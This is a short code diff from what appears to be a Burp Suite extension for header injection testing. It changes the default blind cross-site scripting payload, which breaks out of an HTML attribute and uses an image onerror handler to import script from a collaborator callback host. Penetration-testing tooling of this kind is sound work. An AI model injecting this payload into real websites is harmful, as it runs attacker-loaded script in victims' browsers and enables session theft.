@@ -608,7 +608,7 @@ public class HeaderBangerTab {
     }
 
     private void setDefaultBxssPayload() {
-        String defaultPayload = "Mozilla\"><img/src/onerror=import('//{{collaborator}}')>";
+        String defaultPayload = "\"><img/src/onerror=import('//{{collaborator}}')>";
         extension.setBxssPayload(defaultPayload);
         bxssPayloadField.setText(defaultPayload);
         extension.updateInjectedHeaders();
